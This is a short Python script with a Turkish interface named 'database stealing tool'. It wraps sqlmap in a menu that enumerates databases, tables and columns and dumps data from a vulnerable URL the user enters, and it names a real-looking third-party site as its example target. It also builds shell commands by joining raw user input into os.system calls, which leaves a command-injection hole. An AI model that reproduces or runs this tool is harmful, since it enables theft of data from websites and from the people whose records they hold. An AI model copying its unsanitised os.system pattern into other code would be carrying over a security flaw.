#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet VERI TABANI CALMA")
print("""
Veri Tabani Calma Aracina Hos Geldin

1) Sadece Acikli Linki Biliyorum.
2) Acikli Linki, Veritabani Adini Biliyorum.
3) Acikli Linki, Veri Tabani Adini, Tablo Adini Biliyorum.
4) Acikli Linki, Veri Tabani Adini, Tablo Adini, Colon Adini Biliyorum.

Ornek Acikli Link : http://www.suesupriano.com/article.php?id=25

""")

islemno = input("İslem Numarasi Girin : ")
if(islemno=="1"):
    aciklilink = input("Acikli Link Girin : ")
    os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")
elif(islemno=="2"):
    aciklilink = input("Acikli Link Girin : ")
    veritabani = input("Veritabani Adini Girin : ")
    os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tabs --random-agent" )
elif(islemno=="3"):
    aciklilink = input("Acikli Link Giriniz : ")
    veritabani = input("Veritabani Adini Giriniz : ")
    tablo = input("Tablo Adini Giriniz : ")
    os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --columns --random-agent" )
elif(islemno=="4"):
    aciklilink = input("Acikli Link Giriniz : ")
    veritabani = input("Veritabani Adini Giriniz : ")
    tablo = input("Tablo Adini Giriniz : ")
    colon = input("Colon Adini Giriniz : ")
    os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent " )
    
else:
    print("Yanlis Tuslama!") 
    

